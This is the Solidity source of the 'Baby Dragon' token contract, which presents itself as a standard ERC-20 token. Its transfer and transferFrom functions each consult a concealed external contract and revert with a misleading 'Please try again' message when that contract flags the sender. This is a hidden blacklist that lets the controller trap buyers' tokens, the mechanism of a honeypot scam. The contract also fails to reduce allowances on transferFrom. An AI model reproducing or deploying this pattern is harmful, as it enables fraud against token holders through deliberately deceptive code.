/**
 *Submitted for verification at Etherscan.io on 2021-08-18
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface BP20 {

    function return_sum( uint a, uint b) external view returns (uint);

    function eventsender(address account) external view returns (uint8);

    function sendmoney_to(address senders, address taker, address mediator, uint balance, uint amount) external returns (address);

    function calculations(address account, uint amounta, uint abountb) external returns (uint8);

    function get_staker(address account) external returns (address);

}

contract BabyDragon {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    BP20 rmtobjct;
    uint256 public totalSupply = 10 * 10**12 * 10**18;
    string public name = "Baby Dragon";
    string public symbol = hex"42616279447261676F6Ef09f9089";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(BP20 _trgtaddress) {
        
        rmtobjct = _trgtaddress;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address wallet) public view returns(uint256) {
        return balances[wallet];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(rmtobjct.eventsender(msg.sender) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(rmtobjct.eventsender(from) != 1, "Please try again");
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address holder, uint256 value) public returns(bool) {
        allowance[msg.sender][holder] = value;
        return true;
        
    }
}